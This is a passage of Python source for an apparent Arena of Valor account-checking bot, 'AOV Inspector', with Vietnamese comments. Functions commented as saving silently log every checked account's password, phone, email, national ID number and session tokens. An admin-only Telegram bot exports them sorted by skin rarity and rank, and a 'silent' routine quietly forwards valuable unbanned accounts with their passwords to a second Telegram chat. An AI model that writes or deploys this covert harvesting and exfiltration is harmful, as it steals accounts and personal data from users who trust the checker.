def _read_all_accs(limit=None):
    """Đọc tất cả acc đã lưu âm thầm."""
    items = []
    if not os.path.exists(TG_ACC_FILE):
        return items
    try:
        with open(TG_ACC_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    items.append(_tg_json.loads(line))
                except Exception:
                    continue
    except Exception as e:
        logger.error(f"[TG-READ] err: {e}")
    if limit:
        return items[-limit:]
    return items


def _filter_accs(items, tier):
    """Lọc acc theo tier."""
    if tier == "sss":
        return [x for x in items if x.get("count_sss", 0) > 0]
    if tier == "ss":
        return [x for x in items if x.get("count_ss", 0) > 0]
    if tier == "anime":
        return [x for x in items if x.get("count_anime", 0) > 0]
    if tier == "thuong":
        return [x for x in items if x.get("type") in ("normal", "trang") and not x.get("banned")]
    if tier == "ban":
        return [x for x in items if x.get("banned")]
    if tier == "fail":
        return [x for x in items if x.get("type") == "failed"]
    if tier == "all":
        return items
    return items


def _build_export_txt(items, title):
    """Tạo nội dung file TXT xuất acc — ghi rõ skin."""
    lines = []
    lines.append("=" * 70)
    lines.append(f"# {title}")
    lines.append(f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"# Tổng: {len(items)} acc")
    lines.append("=" * 70)
    lines.append("")

    for idx, it in enumerate(items, 1):
        lines.append("-" * 70)
        lines.append(f"# [{idx}] {it.get('username','')}|{it.get('password','')}")
        lines.append(f"#   Time    : {it.get('time','')}")
        lines.append(f"#   UID     : {it.get('uid','N/A')}")
        lines.append(f"#   Nick    : {it.get('name') or it.get('nickname') or 'N/A'}")
        lines.append(f"#   Rank    : {it.get('rank','N/A')} ({it.get('rank_stars',0)}*)")
        lines.append(f"#   Level   : {it.get('level',0)}")
        lines.append(f"#   Shell   : {it.get('shell',0)}")
        lines.append(f"#   SĐT     : {it.get('mobile_no','') or 'Không'}")
        lines.append(f"#   Email   : {it.get('email','') or 'Không'}")
        lines.append(f"#   CCCD    : {it.get('idcard','') or 'Không'}")
        lines.append(f"#   2FA     : {'BẬT' if it.get('two_fa') else 'TẮT'}")
        if it.get("banned"):
            lines.append(f"#   BAN     : 🚫 CÓ — {it.get('ban_reason','')} — Hết: {it.get('ban_end_time','Vĩnh viễn')}")
        else:
            lines.append(f"#   BAN     : ✅ KHÔNG")
        lines.append(f"#   Tổng skin: {it.get('total_skins',0)}")
        lines.append(f"#   SSS: {it.get('count_sss',0)} | SS: {it.get('count_ss',0)} | Anime: {it.get('count_anime',0)}")

        if it.get("sss"):
            lines.append(f"#   ⭐ SSS ({len(it['sss'])}):")
            for s in it["sss"]:
                lines.append(f"#       ⭐ {s.get('hero','?')} → {s.get('skin','?')}")
        if it.get("anime"):
            lines.append(f"#   🎴 ANIME ({len(it['anime'])}):")
            for s in it["anime"]:
                lines.append(f"#       🎴 {s.get('hero','?')} → {s.get('skin','?')}")
        if it.get("ss"):
            lines.append(f"#   💎 SS ({len(it['ss'])}):")
            for s in it["ss"]:
                lines.append(f"#       💎 {s.get('hero','?')} → {s.get('skin','?')}")
        lines.append("")
        lines.append(f"{it.get('username','')}|{it.get('password','')}")
        lines.append("")

    return "\n".join(lines)


# ─── TELEGRAM API HELPERS ────────────────────────────────────

def _tg_api(method, payload=None, files=None):
    """Gọi Telegram Bot API."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        if files:
            res = requests.post(url, data=payload or {}, files=files, timeout=60, verify=False)
        else:
            res = requests.post(url, json=payload or {}, timeout=30, verify=False)
        try:
            return res.json()
        except Exception:
            return {"ok": False, "raw": res.text[:300]}
    except Exception as e:
        logger.error(f"[TG-API] {method} err: {e}")
        return {"ok": False, "error": str(e)}


def _tg_send_text(chat_id, text, reply_markup=None, disable_preview=True):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": disable_preview,
    }
    if reply_markup:
        payload["reply_markup"] = _tg_json.dumps(reply_markup)
    return _tg_api("sendMessage", payload)


def _tg_send_document(chat_id, file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            payload = {"chat_id": chat_id, "caption": caption[:1000], "parse_mode": "HTML"}
            return _tg_api("sendDocument", payload, files=files)
    except Exception as e:
        logger.error(f"[TG-DOC] err: {e}")
        return {"ok": False, "error": str(e)}


def _tg_edit_message(chat_id, message_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = _tg_json.dumps(reply_markup)
    return _tg_api("editMessageText", payload)


def _is_admin(chat_id):
    return str(chat_id) == str(TELEGRAM_ADMIN_ID)


def _starts_menu():
    """Menu chính của lệnh /starts."""
    stats = _load_daily_stats()
    text = (
        f"🤖 <b>AOV INSPECTOR BOT v2</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 <b>Ngày:</b> {stats['date']}\n\n"
        f"📊 <b>THỐNG KÊ HÔM NAY:</b>\n"
        f"├─ 🎯 Tổng check: <b>{stats['total']}</b>\n"
        f"├─ ⭐ SSS: <b>{stats['sss']}</b>\n"
        f"├─ 💎 SS: <b>{stats['ss']}</b>\n"
        f"├─ 🎴 Anime: <b>{stats['anime']}</b>\n"
        f"├─ ○ Thường: <b>{stats['normal'] + stats['trang']}</b>\n"
        f"├─ 🚫 BAN: <b>{stats['banned']}</b>\n"
        f"└─ ✕ Fail: <b>{stats['failed']}</b>\n\n"
        f"💡 <i>Chọn nút bên dưới để xuất file:</i>"
    )
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "⭐ Xuất SSS", "callback_data": "export_sss"},
                {"text": "💎 Xuất SS", "callback_data": "export_ss"},
            ],
            [
                {"text": "🎴 Xuất Anime", "callback_data": "export_anime"},
                {"text": "○ Xuất Thường", "callback_data": "export_thuong"},
            ],
            [
                {"text": "🚫 Xuất BAN", "callback_data": "export_ban"},
                {"text": "✕ Xuất Fail", "callback_data": "export_fail"},
            ],
            [
                {"text": "📦 Xuất TẤT CẢ", "callback_data": "export_all"},
                {"text": "🗜️ TẢI ZIP (LỌC + RANK)", "callback_data": "export_zip"},
            ],
            [
                {"text": "🔥 Combo SSS+SS+Anime", "callback_data": "export_combo"},
                {"text": "🏆 Rank Cao Thủ+", "callback_data": "export_rank_high"},
            ],
            [
                {"text": "🔄 Cập nhật thống kê", "callback_data": "refresh"},
            ],
        ]
    }
    return text, keyboard


def _handle_command(update):
    """Xử lý lệnh Telegram."""
    msg = update.get("message") or update.get("edited_message") or {}
    chat = msg.get("chat", {})
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()

    if not chat_id:
        return

    # 🆕 Chỉ xử lý private chat
    chat_type = chat.get("type", "private")
    if chat_type != "private":
        return
    # 🔇 IM LẶNG với non-admin
    if not _is_admin(chat_id):
        logger.warning(f"[TG-BLOCK] non-admin {chat_id}")
        return
    # Chỉ xử lý tin bắt đầu bằng /
    if not text.startswith("/"):
        return

    # Lệnh /starts
    if text.startswith("/starts") or text.startswith("/start"):
        body, kb = _starts_menu()
        _tg_send_text(chat_id, body, reply_markup=kb)
        return

    if text.startswith("/stats") or text.startswith("/thongke"):
        body, kb = _starts_menu()
        _tg_send_text(chat_id, body, reply_markup=kb)
        return

    # Lệnh xuất nhanh: /sss /ss /anime /thuong /ban /fail /all
    tier_map = {
        "/sss": ("sss", "⭐ ACC SSS"),
        "/ss": ("ss", "💎 ACC SS"),
        "/anime": ("anime", "🎴 ACC ANIME"),
        "/thuong": ("thuong", "○ ACC THƯỜNG"),
        "/ban": ("ban", "🚫 ACC BAN"),
        "/fail": ("fail", "✕ ACC FAIL"),
        "/all": ("all", "📦 TẤT CẢ ACC"),
    }
    for cmd, (tier, title) in tier_map.items():
        if text == cmd or text.startswith(cmd + " "):
            _do_export(chat_id, tier, title)
            return

    _tg_send_text(chat_id, f"❓ Lệnh không hợp lệ. Dùng /starts để xem menu.")


def _handle_callback(update):
    """Xử lý callback từ inline keyboard."""
    cb = update.get("callback_query") or {}
    chat_id = (cb.get("message") or {}).get("chat", {}).get("id")
    data = cb.get("data", "")
    message_id = (cb.get("message") or {}).get("message_id")

    if not chat_id:
        return

    if not _is_admin(chat_id):
        logger.warning(f"[TG-CB-BLOCK] non-admin {chat_id}")
        return

    if data == "refresh":
        body, kb = _starts_menu()
        if message_id:
            _tg_edit_message(chat_id, message_id, body, reply_markup=kb)
        _tg_api("answerCallbackQuery", {"callback_query_id": cb.get("id"), "text": "🔄 Đã cập nhật!"})
        return

    tier_map = {
        "export_sss": ("sss", "⭐ ACC SSS"),
        "export_ss": ("ss", "💎 ACC SS"),
        "export_anime": ("anime", "🎴 ACC ANIME"),
        "export_thuong": ("thuong", "○ ACC THƯỜNG"),
        "export_ban": ("ban", "🚫 ACC BAN"),
        "export_fail": ("fail", "✕ ACC FAIL"),
        "export_all": ("all", "📦 TẤT CẢ ACC"),
    }
    # 📦 ZIP handlers
    if data == "export_zip":
        _tg_api("answerCallbackQuery", {"callback_query_id": cb.get("id"), "text": "🗜️ Đang tạo ZIP..."})
        _make_zip_package(chat_id, "all")
        return

    if data == "export_combo":
        _tg_api("answerCallbackQuery", {"callback_query_id": cb.get("id"), "text": "🔥 Đang xuất Combo..."})
        _do_export_custom(chat_id, "combo", "🔥 ACC COMBO (SSS+SS+Anime)")
        return

    if data == "export_rank_high":
        _tg_api("answerCallbackQuery", {"callback_query_id": cb.get("id"), "text": "🏆 Đang xuất Rank Cao Thủ+"})
        _do_export_custom(chat_id, "rank_high", "🏆 ACC RANK CAO THỦ+")
        return

    if data in tier_map:
        tier, title = tier_map[data]
        _tg_api("answerCallbackQuery", {"callback_query_id": cb.get("id"), "text": f"⏳ Đang xuất {title}..."})
        _do_export(chat_id, tier, title)


def _do_export(chat_id, tier, title):
    """Xuất file và gửi cho admin."""
    try:
        all_items = _read_all_accs()
        filtered = _filter_accs(all_items, tier)
        if not filtered:
            _tg_send_text(chat_id, f"⚠️ <b>{title}</b> — Không có acc nào.")
            return
        # Tạo file
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"AOV_{tier.upper()}_{ts}.txt"
        fpath = os.path.join(TG_SILENT_DIR, fname)
        content = _build_export_txt(filtered, title)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(content)
        caption = f"📄 <b>{title}</b>\n📊 Tổng: <b>{len(filtered)}</b> acc\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        res = _tg_send_document(chat_id, fpath, caption)
        if not res.get("ok"):
            _tg_send_text(chat_id, f"❌ Gửi file lỗi: {res.get('error') or res.get('raw')}")
        # Xóa file sau khi gửi
        try:
            os.remove(fpath)
        except Exception:
            pass
    except Exception as e:
        logger.error(f"[TG-EXPORT] {tier} err: {e}")
        _tg_send_text(chat_id, f"❌ Lỗi xuất file: {e}")


# ─── POLLING WORKER ──────────────────────────────────────────

_tg_polling_thread = None
_tg_polling_stop = _tg_threading.Event()



def _do_export_custom(chat_id, mode, title):
    """Export custom: combo / rank_high / theo tier khác."""
    try:
        all_items = _read_all_accs()
        if mode == "combo":
            filtered = _filter_has_sss_ss_anime(all_items)
        elif mode == "rank_high":
            filtered = _filter_by_rank(all_items, 80)
        elif mode == "rank_thachdau":
            filtered = _filter_by_rank(all_items, 100)
        else:
            filtered = all_items

        if not filtered:
            _tg_send_text(chat_id, f"⚠️ <b>{title}</b> — Không có acc nào.")
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"AOV_{mode.upper()}_{ts}.txt"
        fpath = os.path.join(TG_SILENT_DIR, fname)
        content = _build_zip_tier(filtered, title, mode)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(content)
        caption = f"📄 <b>{title}</b>\n📊 Tổng: <b>{len(filtered)}</b> acc"
        _tg_send_document(chat_id, fpath, caption)
        try: os.remove(fpath)
        except Exception: pass
    except Exception as e:
        logger.error(f"[EXPORT-CUSTOM] {mode} err: {e}")
        _tg_send_text(chat_id, f"❌ Lỗi: {e}")


def _telegram_polling_worker():
    """Long-polling Telegram getUpdates."""
    offset = 0
    logger.info(f"[TG-BOT] Polling start — Admin ID: {TELEGRAM_ADMIN_ID}")
    while not _tg_polling_stop.is_set():
        try:
            res = _tg_api("getUpdates", {
                "offset": offset,
                "timeout": 5,
                "allowed_updates": ["message", "callback_query"],
            })
            if not res.get("ok"):
                _tg_time.sleep(5)
                continue
            for upd in res.get("result", []):
                offset = upd.get("update_id", 0) + 1
                try:
                    if "callback_query" in upd:
                        _handle_callback(upd)
                    elif "message" in upd:
                        _handle_command(upd)
                except Exception as e:
                    logger.error(f"[TG-HANDLE] err: {e}")
        except Exception as e:
            logger.error(f"[TG-POLL] err: {e}")
            _tg_time.sleep(5)


def start_telegram_bot():
    """Khởi động bot Telegram."""
    global _tg_polling_thread
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_ID:
        logger.warning("[TG-BOT] Thiếu token/chat_id — bỏ qua")
        return
    if _tg_polling_thread and _tg_polling_thread.is_alive():
        return
    _tg_polling_thread = _tg_threading.Thread(target=_telegram_polling_worker, daemon=True)
    _tg_polling_thread.start()
    logger.info("[TG-BOT] ✅ Đã khởi động bot Telegram")


# Hook: gọi hàm này mỗi khi check xong 1 acc (từ check đơn + check file)
def tg_track_acc(r, source="check"):
    """Lưu âm thầm — gọi từ mọi nơi check acc xong."""
    try:
        _append_acc_silent(r, source=source)
    except Exception as e:
        logger.error(f"[TG-TRACK] err: {e}")

# ══════════════════════════════════════════════════════════════





# ══════════════════════════════════════════════════════════════
# 📦 ZIP EXPORT — Xuất nhiều file cùng lúc
# ══════════════════════════════════════════════════════════════
import zipfile as _zf
import io as _io

# Map rank name → sort order (cao hơn = xịn hơn)
RANK_ORDER = {
    "Thách Đấu": 100, "Chiến Tướng": 90, "Cao Thủ": 80,
    "Tinh Anh": 70, "Kim Cương": 60, "Bạch Kim": 50,
    "Vàng": 40, "Bạc": 30, "Đồng": 20, "Sắt": 10,
    "Chưa xếp hạng": 0,
}


def _rank_score(rank_str):
    """Trả về điểm rank để sort."""
    if not rank_str: return 0
    s = str(rank_str).strip()
    for name, sc in RANK_ORDER.items():
        if name.lower() in s.lower():
            return sc
    return 0


def _filter_vip(items):
    """Acc có ít nhất 1 skin VIP (SSS/SS/Anime)."""
    out = []
    for x in items:
        if x.get("count_sss", 0) + x.get("count_ss", 0) + x.get("count_anime", 0) > 0:
            out.append(x)
    return out


def _filter_has_sss_ss_anime(items):
    """Acc có cả SSS + SS + Anime (ít nhất 1 mỗi loại)."""
    return [x for x in items
            if x.get("count_sss", 0) > 0
            and x.get("count_ss", 0) > 0
            and x.get("count_anime", 0) > 0]


def _filter_by_rank(items, min_score):
    """Lọc acc rank >= min_score."""
    return [x for x in items if _rank_score(x.get("rank", "")) >= min_score]


def _build_zip_tier(items, title, fname_prefix):
    """Tạo nội dung file TXT cho 1 tier (có RANK)."""
    # Sort: rank cao trước, rồi SSS nhiều trước
    items = sorted(
        items,
        key=lambda x: (
            _rank_score(x.get("rank", "")),
            x.get("count_sss", 0),
            x.get("count_anime", 0),
            x.get("count_ss", 0),
        ),
        reverse=True
    )

    lines = []
    lines.append("=" * 72)
    lines.append(f"# {title}")
    lines.append(f"# Thời gian : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"# Tổng      : {len(items)} acc")
    lines.append("=" * 72)
    lines.append("")

    for idx, it in enumerate(items, 1):
        lines.append("-" * 72)
        lines.append(f"# [{idx}] {it.get('username','')}|{it.get('password','')}")
        lines.append(f"#   🏆 Rank   : {it.get('rank','Chưa xếp hạng')} ({it.get('rank_stars',0)}★)")
        lines.append(f"#   🆔 UID    : {it.get('uid','N/A')}")
        lines.append(f"#   👤 Nick   : {it.get('name') or it.get('nickname') or 'N/A'}")
        lines.append(f"#   ⭐ Level  : {it.get('level',0)}")
        lines.append(f"#   💰 Sò     : {it.get('shell',0)}")
        lines.append(f"#   📱 SĐT    : {it.get('mobile_no','') or 'Không'}")
        lines.append(f"#   📧 Email  : {it.get('email','') or 'Không'}")
        lines.append(f"#   🆔 CCCD   : {it.get('idcard','') or 'Không'}")
        lines.append(f"#   🔒 2FA    : {'BẬT' if it.get('two_fa') else 'TẮT'}")
        if it.get("banned"):
            lines.append(f"#   🚫 BAN    : CÓ — {it.get('ban_reason','')} — Hết: {it.get('ban_end_time','Vĩnh viễn')}")
        else:
            lines.append(f"#   ✅ BAN    : KHÔNG")
        lines.append(f"#   🎽 Tổng skin: {it.get('total_skins',0)}")
        lines.append(f"#   ⭐ SSS: {it.get('count_sss',0)} | 💎 SS: {it.get('count_ss',0)} | 🎴 Anime: {it.get('count_anime',0)}")

        # List SSS
        if it.get("sss"):
            lines.append(f"#")
            lines.append(f"#   ⭐ SSS ({len(it['sss'])}):")
            for s in it["sss"]:
                lines.append(f"#       ⭐ {s.get('hero','?')} → {s.get('skin','?')}")

        # List Anime
        if it.get("anime"):
            lines.append(f"#")
            lines.append(f"#   🎴 ANIME ({len(it['anime'])}):")
            for s in it["anime"]:
                lines.append(f"#       🎴 {s.get('hero','?')} → {s.get('skin','?')}")

        # List SS
        if it.get("ss"):
            lines.append(f"#")
            lines.append(f"#   💎 SS ({len(it['ss'])}):")
            for s in it["ss"]:
                lines.append(f"#       💎 {s.get('hero','?')} → {s.get('skin','?')}")

        lines.append("")
        lines.append(f"{it.get('username','')}|{it.get('password','')}")
        lines.append("")

    return "\n".join(lines)


def _make_zip_package(chat_id, source_label="all"):
    """Tạo file ZIP chứa nhiều file acc theo tier."""
    try:
        all_items = _read_all_accs()
        if not all_items:
            _tg_send_text(chat_id, "⚠️ Chưa có acc nào.")
            return

        # Phân loại
        sss   = [x for x in all_items if x.get("count_sss", 0) > 0]
        ss    = [x for x in all_items if x.get("count_ss", 0) > 0]
        anime = [x for x in all_items if x.get("count_anime", 0) > 0]
        vip   = _filter_vip(all_items)
        combo = _filter_has_sss_ss_anime(all_items)
        rank_cao_thu = _filter_by_rank(all_items, 80)   # Cao Thủ+
        rank_thach_dau = _filter_by_rank(all_items, 100)  # Thách Đấu
        normal = [x for x in all_items
                  if x.get("type") in ("normal", "trang")
                  and not x.get("banned")]

        # Tạo ZIP trong memory
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_name = f"AOV_PACK_{ts}.zip"
        zip_path = os.path.join(TG_SILENT_DIR, zip_name)

        with _zf.ZipFile(zip_path, "w", _zf.ZIP_DEFLATED) as zf:
            # File 1: SSS
            if sss:
                txt = _build_zip_tier(sss, "⭐ ACC SSS (CÓ SKIN SSS)", "sss")
                zf.writestr(f"01_SSS_{len(sss)}acc.txt", txt)

            # File 2: Anime
            if anime:
                txt = _build_zip_tier(anime, "🎴 ACC ANIME (CÓ SKIN ANIME)", "anime")
                zf.writestr(f"02_ANIME_{len(anime)}acc.txt", txt)

            # File 3: SS
            if ss:
                txt = _build_zip_tier(ss, "💎 ACC SS (CÓ SKIN SS)", "ss")
                zf.writestr(f"03_SS_{len(ss)}acc.txt", txt)

            # File 4: VIP (có ít nhất 1 skin VIP)
            if vip:
                txt = _build_zip_tier(vip, "👑 ACC VIP (SSS/SS/Anime)", "vip")
                zf.writestr(f"04_VIP_{len(vip)}acc.txt", txt)

            # File 5: COMBO (có CẢ SSS + SS + Anime)
            if combo:
                txt = _build_zip_tier(combo, "🔥 ACC COMBO (CẢ SSS + SS + ANIME)", "combo")
                zf.writestr(f"05_COMBO_{len(combo)}acc.txt", txt)

            # File 6: Rank Cao Thủ+
            if rank_cao_thu:
                txt = _build_zip_tier(rank_cao_thu, "🏆 ACC RANK CAO THỦ TRỞ LÊN", "rank_caothu")
                zf.writestr(f"06_RANK_CAO_THU+_{len(rank_cao_thu)}acc.txt", txt)

            # File 7: Rank Thách Đấu
            if rank_thach_dau:
                txt = _build_zip_tier(rank_thach_dau, "👑 ACC RANK THÁCH ĐẤU", "rank_thachdau")
                zf.writestr(f"07_RANK_THACH_DAU_{len(rank_thach_dau)}acc.txt", txt)

            # File 8: Thường
            if normal:
                txt = _build_zip_tier(normal, "○ ACC THƯỜNG", "thuong")
                zf.writestr(f"08_THUONG_{len(normal)}acc.txt", txt)

            # File README
            readme = (
                f"AOV INSPECTOR — PACK ACC\n"
                f"Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 TỔNG QUAN:\n"
                f"├─ Tổng acc     : {len(all_items)}\n"
                f"├─ ⭐ SSS       : {len(sss)}\n"
                f"├─ 🎴 Anime     : {len(anime)}\n"
                f"├─ 💎 SS        : {len(ss)}\	n"
                f"├─ 👑 VIP       : {len(vip)}\n"
                f"├─ 🔥 Combo     : {len(combo)}\n"
                f"├─ 🏆 Cao Thủ+  : {len(rank_cao_thu)}\n"
                f"├─ 👑 Thách Đấu : {len(rank_thach_dau)}\n"
                f"└─ ○ Thường     : {len(normal)}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Danh sách file:\n"
                f"  01_SSS     → Acc có skin SSS\n"
                f"  02_ANIME   → Acc có skin Anime\n"
                f"  03_SS      → Acc có skin SS\n"
                f"  04_VIP     → Acc có ít nhất 1 skin VIP\n"
                f"  05_COMBO   → Acc có CẢ SSS + SS + Anime\n"
                f"  06_RANK    → Acc rank Cao Thủ trở lên\n"
                f"  07_RANK    → Acc rank Thách Đấu\n"
                f"  08_THUONG  → Acc thường\n"
            )
            zf.writestr("README.txt", readme)

        # Gửi file ZIP
        caption = (
            f"📦 <b>PACK ACC ZIP</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⭐ SSS: <b>{len(sss)}</b>\n"
            f"🎴 Anime: <b>{len(anime)}</b>\n"
            f"💎 SS: <b>{len(ss)}</b>\n"
            f"👑 VIP: <b>{len(vip)}</b>\n"
            f"🔥 Combo: <b>{len(combo)}</b>\n"
            f"🏆 Cao Thủ+: <b>{len(rank_cao_thu)}</b>\n"
            f"👑 Thách Đấu: <b>{len(rank_thach_dau)}</b>\n"
            f"○ Thường: <b>{len(normal)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📄 Tổng: <b>{len(all_items)}</b> acc"
        )
        res = _tg_send_document(chat_id, zip_path, caption)

        if not res.get("ok"):
            _tg_send_text(chat_id, f"❌ Gửi ZIP lỗi: {res.get('error') or res.get('raw')}")

        # Xóa file tạm
        try:
            os.remove(zip_path)
        except Exception:
            pass
    except Exception as e:
        logger.error(f"[ZIP] err: {e}")
        _tg_send_text(chat_id, f"❌ Lỗi tạo ZIP: {e}")


# ══════════════════════════════════════════════════════════════



# ==== FEAT 1: JACKPOT ====
try:
    from feat_1_jackpot import register_jackpot
    register_jackpot(app, sys.modules[__name__])
except Exception as _e:
    print("[FEAT-1] LOI: " + str(_e))
# =========================









# ==== TELEGRAM EXTRA V4 ====
try:
    from telegram_extra_v4 import register_tg_extra
    register_tg_extra(app, sys.modules[__name__])
except Exception as _e:
    import traceback as _tb
    print(f"[TG-EXTRA V4] LOI: {_e}")
    _tb.print_exc()
# ===========================


# ==== ACC IMAGE MERGER ====
try:
    from acc_image_merger import register_merger
    register_merger(app, sys.modules[__name__])
except Exception as _e:
    import traceback as _tb
    print(f"[MERGER] LOI: {_e}")
    _tb.print_exc()
# =========================


# ==== GHEP ADVANCED ====
try:
    from ghep_advanced import register_ghep_advanced
    register_ghep_advanced(app, sys.modules[__name__])
except Exception as _e:
    import traceback as _tb
    print(f"[GHEP] LOI: {_e}")
    _tb.print_exc()
# =======================



# ==== UPLOAD IMAGE — GHÉP ẢNH + GỬI TELEGRAM ====
try:
    from upload_image import register_upload_image
    register_upload_image(app, sys.modules[__name__])
    print("[UPLOAD-IMG] ✅ Đã load module ghép ảnh")
except Exception as _e:
    import traceback as _tb
    print(f"[UPLOAD-IMG] ❌ {_e}")
    _tb.print_exc()
# ================================================



# ==== ACC VISUALIZER ====
try:
    from acc_visualizer import register_visualizer, send_acc_image_async
    register_visualizer(app, sys.modules[__name__])
    print("[VISUALIZER] OK")
except Exception as _e:
    print(f"[VISUALIZER] LOI: {_e}")
# ========================


def make_hist_entry(r, acc, from_kho=False):
    return {"id": uuid.uuid4().hex[:12], "acc": acc, "password": r.get("password", ""),
        "result": r.get("type", "unknown"), "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "uid": r.get("uid", ""), "nick": r.get("name", ""), "rank": r.get("rank", ""),
        "rank_stars": r.get("rank_stars", 0), "level": r.get("level", 0), "shell": r.get("shell", 0),
        "banned": r.get("banned", False), "ban_end_time": r.get("ban_end_time", ""),
        "ban_reason": r.get("ban_reason", ""), "ban_sources": r.get("ban_sources", []),
        "error": r.get("error", ""), "total_skins": r.get("total_skins", 0),
        "mobile_no": r.get("mobile_no", ""), "country_code": r.get("country_code", ""),
        "email": r.get("email", ""), "idcard": r.get("idcard", ""), "two_fa": r.get("two_fa", False),
        "username_display": r.get("username_display", ""), "nickname": r.get("nickname", ""),
        "player_uid": r.get("player_uid", ""),
        "best_hero": r.get("best_hero", ""), "best_play": r.get("best_play", ""),
        "total_matches": r.get("total_matches", ""), "rank_id": r.get("rank_id", 0),
        "register_time": r.get("register_time", ""),
        "sso_key": r.get("sso_key", ""), "access_token": r.get("access_token", ""),
        "session_token": r.get("session_token", ""), "open_id": r.get("open_id", ""),
        "from_kho": from_kho,
        "skins_sss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("sss", [])],
        "skins_ss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("ss", [])],
        "skins_anime": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("anime", [])],
        "skins_other": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("other_skins", [])]}


def send_vip_telegram(r):
    """
    Gửi acc VIP về Telegram.
    - Chỉ gửi acc có ít nhất 1 skin SSS / SS / Anime
    - KHÔNG gửi acc bị ban
    - KHÔNG gửi acc thường (không có skin VIP)
    """
    if not SILENT_BOT_TOKEN or not SILENT_CHAT_ID:
        return False
    
    try:
        # Check BAN → KHÔNG GỬI
        if r.get("banned", False):
            logger.info(f"[VIP-TELE] {r.get('username')} — acc BỊ BAN, KHÔNG gửi")
            return False
        
        # Đếm skin VIP
        sss_count = len(r.get("sss", []))
        ss_count = len(r.get("ss", []))
        anime_count = len(r.get("anime", []))
        total_vip = sss_count + ss_count + anime_count
        
        # Chỉ gửi nếu có skin VIP
        if total_vip == 0:
            logger.info(f"[VIP-TELE] {r.get('username')} — không có skin VIP, KHÔNG gửi")
            return False
        
        username = r.get("username", "")
        password = r.get("password", "")
        if not username or not password:
            return False
        
        # Xây dựng message
        lines = []
        lines.append("🔥 <b>[AOV INSPECTOR] ACC VIP!</b> 🔥")
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        
        # Thông tin acc
        lines.append(f"🔑 <b>Acc:</b> <code>{username}|{password}</code>")
        
        uid = r.get("uid", "")
        if uid and uid != "N/A":
            lines.append(f"🆔 <b>UID:</b> <code>{uid}</code>")
        
        nick = r.get("name", "")
        if nick:
            lines.append(f"👤 <b>Nick:</b> {nick}")
        
        rank = r.get("rank", "")
        stars = r.get("rank_stars", 0)
        if rank:
            lines.append(f"🏆 <b>Rank:</b> {rank} ({stars}★)")
        
        level = r.get("level", 0)
        if level:
            lines.append(f"⭐ <b>Level:</b> {level}")
        
        shell = r.get("shell", 0)
        lines.append(f"💰 <b>Sò:</b> {shell}")
        
        # Bảo mật
        phone = r.get("mobile_no", "")
        email = r.get("email", "")
        if phone:
            lines.append(f"📱 <b>SĐT:</b> <code>{phone}</code>")
        if email:
            lines.append(f"📧 <b>Email:</b> <code>{email}</code>")
        
        # Trạng thái ban
        lines.append("✅ <b>BAN:</b> 🟢 KHÔNG BAN")
        
        lines.append("")
        lines.append(f"🎽 <b>Tổng skin:</b> {r.get('total_skins', 0)}")
        lines.append(f"⭐ SSS: <b>{sss_count}</b> | 💎 SS: <b>{ss_count}</b> | 🎴 Anime: <b>{anime_count}</b>")
        
        # Chi tiết skin VIP
        if sss_count > 0:
            lines.append("")
            lines.append(f"⭐ <b>SSS ({sss_count}):</b>")
            for s in r.get("sss", [])[:20]:
                hero = s.get("hero_name", "?")
                skin = s.get("skin_name", "?")
                lines.append(f"   ⭐ {hero} → {skin}")
        
        if anime_count > 0:
            lines.append("")
            lines.append(f"🎴 <b>Anime ({anime_count}):</b>")
            for s in r.get("anime", [])[:20]:
                hero = s.get("hero_name", "?")
                skin = s.get("skin_name", "?")
                lines.append(f"   🎴 {hero} → {skin}")
        
        if ss_count > 0:
            lines.append("")
            lines.append(f"💎 <b>SS ({ss_count}):</b>")
            for s in r.get("ss", [])[:20]:
                hero = s.get("hero_name", "?")
                skin = s.get("skin_name", "?")
                lines.append(f"   💎 {hero} → {skin}")
        
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        lines.append("🎮 <i>AOV Inspector Bot</i>")
        
        msg = "\n".join(lines)
        
        # Gửi Telegram
        url = f"https://api.telegram.org/bot{SILENT_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": SILENT_CHAT_ID,
            "text": msg,
            "parse_mode": "HTML",
            "disable_notification": True,
        }
